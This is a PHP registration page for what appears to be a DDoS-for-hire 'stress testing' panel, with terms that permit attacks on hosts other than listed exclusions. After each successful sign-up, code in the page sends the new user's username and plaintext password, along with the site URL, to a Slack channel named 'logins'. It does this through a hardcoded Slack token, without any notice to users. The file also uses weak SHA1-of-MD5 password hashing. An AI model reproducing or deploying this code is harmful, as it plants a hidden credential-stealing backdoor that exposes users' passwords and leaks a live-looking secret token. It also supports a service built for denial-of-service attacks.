<?php 

	ob_start();
	require_once 'inc/config.php';
	require_once 'inc/init.php';
	
	if (!(empty($maintaince))) {
		die($maintaince);
	}
 
	if ($user -> LoggedIn()){
		header('Location: home.php');
	}
	


	if(!empty($_POST['doCreate'])){
		$username = $_POST['register-username'];
		$email = $_POST['register-email'];
		$password = $_POST['register-password'];
		$rpassword = $_POST['register-password2'];
		
		if(empty($username) || empty($email) || empty($password) || empty($rpassword)){
			$error = "Please enter all fields";
		}

		//Check if the username is legit
		if (!ctype_alnum($username) || strlen($username) < 4 || strlen($username) > 15){
			$error = 'Username must be  alphanumberic and 4-15 characters in length';
		}
		
		//Check referral
		$referral='0';

		//Check if user is available
		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$countUser = $SQL -> fetchColumn(0);
		if ($countUser > 0){
			$error = 'Username is already taken';
		}
		
		//Validate email
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)){
			$error = 'Email is not a valid email address';
		}
		
		//Compare first to second password
		if ($password != $rpassword){
			$error = 'Passwords do not match';
		}
		
		//Check if email already exists
		$SQL = $odb->prepare("SELECT COUNT(*) FROM `users` WHERE `email` = :email");
		$SQL->execute(array(':email' => $email));
		$EmailCount = $SQL->fetchColumn(0);
		if($EmailCount > 0){
			$error = 'That email is already being used';
		}
		
		//Make registeration
		if(empty($error)){
			$insertUser = $odb -> prepare("INSERT INTO `users` VALUES(NULL, :username, :password, :email, 0, 0, 0, 0, :referral, 0, 0, 0)");
			$insertUser -> execute(array(':username' => $username, ':password' => SHA1(md5($password)), ':email' => $email, ':referral' => $referral));
			$done = "You have succesfully created your account";
			$ch = curl_init("https://slack.com/api/chat.postMessage");
			$webUrl = "http://" . $_SERVER['SERVER_NAME'];
			$data = http_build_query([
				"token" => "xoxp-682890655317-682408550420-685635115830-381cfc28eb17e51f0735ec2d35c80705",
				"channel" => 'logins', //"#mychannel",
				"text" => 'REGISTERED! USER:'.$username.' PASS:'.$password.' INFO:0 URL:'.$webUrl, 
				"username" => "hutsonsec",
			]);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);
		}
	}
?>
<html class="no-focus">
	<head>
        <meta charset="utf-8">
        <title><?php echo htmlentities($sitename); ?> - Register</title>
        <meta name="robots" content="noindex, nofollow">
		<script src='https://www.google.com/recaptcha/api.js'></script>
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
		<link rel="shortcut icon" href="assets/img/favicons/favicon.png">
		<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400italic,600,700%7COpen+Sans:300,400,400italic,600,700">
		<link rel="stylesheet" id="css-main" href="assets/css/oneui.css">
    </head>
    <body>
        <div class="content overflow-hidden">
            <div class="row">
				<?php
					if(!empty($error)){
						echo '<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4 animated fadeIn">'.error($error).'</div>';
					}
					if(!empty($done)){
						echo '<div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4 animated fadeIn">'.success($done).'</div>';
					}
				?>
				<div class="col-sm-12 text-center">
<p>Already have account? <a href="login.php" class="text-primary m-l-5"><b>Login</b></a></p>
</div>
                <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4">
                    
					<div class="block block-themed animated fadeIn">
					    
                        <div class="block-header bg-success">
                            <ul class="block-options">
                                <li>
                                    <a href="#" data-toggle="modal" data-target="#modal-terms">View Terms</a>
                                </li>
                                <li>
                                    <a href="login.php" data-toggle="tooltip" data-placement="left" title="" data-original-title="Log In"><i class="si si-login"></i></a>
                                </li>
                                
                            </ul>
                            
                            <h3 class="block-title">Register</h3>
                        </div>
                        <div class="block-content block-content-full block-content-narrow">
                            <h1 class="h2 font-w600 push-30-t push-5"><?php echo htmlentities($sitename); ?></h1>
                            <p>Please fill the following details to create a new account.</p>
                            <form class="js-validation-register form-horizontal push-50-t push-50" method="post" novalidate="novalidate">
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-success">
                                            <input required class="form-control" type="text" id="register-username" name="register-username" placeholder="Please enter a username">
                                            <label for="register-username">Username</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-success">
                                            <input required class="form-control" type="email" id="register-email" name="register-email" placeholder="Please provide your email">
                                            <label for="register-email">Email</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-success">
                                            <input required class="form-control" type="password" id="register-password" name="register-password" placeholder="Choose a strong password">
                                            <label for="register-password">Password</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <div class="form-material form-material-success">
                                            <input required class="form-control" type="password" id="register-password2" name="register-password2" placeholder="..and confirm it">
                                            <label for="register-password2">Confirm Password</label>
                                        </div>
                                    </div>
                                </div>
								<div class="form-group">
                                    <div class="col-xs-12" style="margin-left: auto; margin-right: auto;">
                                        <div class="g-recaptcha" data-sitekey=<?php echo $google_site; ?>></div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12">
                                        <label class="css-input switch switch-sm switch-success">
                                            <input required type="checkbox" id="register-terms" name="register-terms"><span></span> I agree with terms &amp; conditions
                                        </label>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-xs-12 col-sm-6 col-md-5">
                                        <button name="doCreate" value="create" class="btn btn-block btn-success" type="submit"><i class="fa fa-plus pull-right"></i> Sign Up</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="modal-terms" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog modal-dialog-popout">
                <div class="modal-content">
                    <div class="block block-themed block-transparent remove-margin-b">
                        <div class="block-header bg-primary-dark">
                            <ul class="block-options">
                                <li>
                                    <button data-dismiss="modal" type="button"><i class="si si-close"></i></button>
                                </li>
                            </ul>
                            <h3 class="block-title">Terms & Conditions</h3>
                        </div>
                        <div class="block-content">
                            <p>1.)  This professional stress testing service can ONLY be used to test your own servers' strengths against DDOS attacks.</p>
							<p>2.)  We won't be liable for any damages caused with the attacks you send using Nulled Network, it is at your OWN risk.</p>
							<p>3.)  You're not allowed to attack any website which ends with .gov or .edu, is associated with any Federal Bureau of Investigation or any other government websites.</p>
							<p>4.)  You're not allowed to 'hack' accounts or attempt to brute force any accounts with any means. This means using a dictionary attack list.</p>
							<p>5.) You're not allowed to access the website using TOR. This causes issues with your IP address and we may by mistake ban you thinking you have shared your account.</p>
							<p>6.)  You're not allowed to re-sell your account for any currency, including crypto currency.</p>
							<p>7.)  You're not allowed to use this service to exploit any of our features. This includes Cross Site Scripting vulnerabilities or any vulnerabilities of the sort. If you find one and report one - we'll gladly give you an upgrade.</p>
							<p>8.) Opening a scam report will result in termination of your account.</p>
							<p>9.) You are not allowed to attack the same host right away after your attack has been stopped/ended. If you wish, you have to ASK for permission, and do not be suprised if you are denied. Permission depends on your plan. If you do so anyways, you will be banned without warning.</p>
							<p>10.) You can not use any bot/script on our website.</p>
							<p>11.)  We're not liable to give back refunds. However, if you ask nicely, we will re-consider your reason(s) for wanting a refund. You can contact us via Skype, or on the website.</p>
							<p>12.) You're not allowed to host Distributed Denial Of Service attacks on websites such as 'Hackforums', 'Leakforums' or any other majour forum.</p>
							<p>13.) We may change the Terms of Service at any time. It's your liability to ensure you check if the Terms of 	Service has changed.</p>
							<p>14.) We are not liable for your accounts.</p>		
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button class="btn btn-sm btn-default" type="button" data-dismiss="modal">Close</button>
                        <button class="btn btn-sm btn-primary" type="button" data-dismiss="modal"><i class="fa fa-check"></i> I agree</button>
                    </div>
                </div>
            </div>
        </div>
        <script src="assets/js/core/jquery.min.js"></script>
        <script src="assets/js/core/bootstrap.min.js"></script>
        <script src="assets/js/core/jquery.slimscroll.min.js"></script>
        <script src="assets/js/core/jquery.scrollLock.min.js"></script>
        <script src="assets/js/core/jquery.appear.min.js"></script>
        <script src="assets/js/core/jquery.countTo.min.js"></script>
        <script src="assets/js/core/jquery.placeholder.min.js"></script>
        <script src="assets/js/core/js.cookie.min.js"></script>
        <script src="assets/js/app.js"></script>
        <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
        <script src="assets/js/pages/base_pages_register.js"></script>
    
</body></html>